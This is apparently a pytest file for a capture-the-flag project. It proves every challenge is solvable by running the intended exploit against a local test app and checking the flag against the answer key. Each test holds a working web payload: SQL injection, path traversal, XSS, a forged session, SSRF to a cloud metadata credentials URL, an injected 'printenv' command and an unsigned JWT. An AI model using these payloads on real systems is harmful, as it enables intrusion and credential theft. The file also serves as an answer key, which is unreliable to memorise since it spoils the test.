"""Prove every challenge is solvable and its flag matches the answer key.

For each challenge we perform the intended exploit against the target app,
capture the flag, and confirm it validates against challenges.json. If any of
these fail, that challenge is broken or unsolvable.
"""

import base64
import json
import os
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from ctf import flag_hash, load_challenges  # noqa: E402
from target.app import create_target_app  # noqa: E402

CHALLENGES = {c["id"]: c for c in load_challenges()}


def _b64url(obj) -> str:
    raw = obj if isinstance(obj, bytes) else json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


@pytest.fixture
def client():
    app = create_target_app()
    app.testing = True
    return app.test_client()


def _validates(cid: str, flag: str) -> bool:
    c = CHALLENGES[cid]
    return flag_hash(c["salt"], flag) == c["flag_sha256"]


def test_idor(client):
    data = client.get("/api/account/3").get_json()
    assert _validates("idor", data["secret_note"])


def test_sqli(client):
    payload = "' UNION SELECT flag, label FROM secrets-- -"
    rows = client.get("/api/search", query_string={"username": payload}).get_json()
    captured = rows[-1]["username"]
    assert _validates("sqli", captured)


def test_traversal(client):
    body = client.get("/download", query_string={"file": "../ctf_flag.txt"}).get_data(as_text=True)
    assert _validates("traversal", body.strip())


def test_xss(client):
    resp = client.get("/greet", query_string={"name": "<script>x</script>"})
    assert _validates("xss", resp.headers["X-Admin-Cookie"])


def test_session(client):
    token = base64.urlsafe_b64encode(b"admin:admin").decode()
    data = client.get("/ctf/admin", headers={"X-Session": token}).get_json()
    assert _validates("session", data["flag"])


def test_ssrf(client):
    url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/role"
    body = client.get("/fetch", query_string={"url": url}).get_data(as_text=True)
    assert _validates("ssrf", body.strip())


def test_cmdi(client):
    out = client.get("/diag", query_string={"host": "x; printenv CTF_FLAG"}).get_json()["output"]
    captured = out.strip().splitlines()[-1]
    assert _validates("cmdi", captured)


def test_jwt(client):
    token = f"{_b64url({'alg': 'none', 'typ': 'JWT'})}.{_b64url({'user': 'admin'})}."
    data = client.get("/ctf/jwt-admin", headers={"Authorization": f"Bearer {token}"}).get_json()
    assert _validates("jwt", data["flag"])


def test_all_challenges_have_a_solve_test():
    solve_tests = {name[len("test_"):] for name in globals() if name.startswith("test_")}
    assert set(CHALLENGES).issubset(solve_tests)
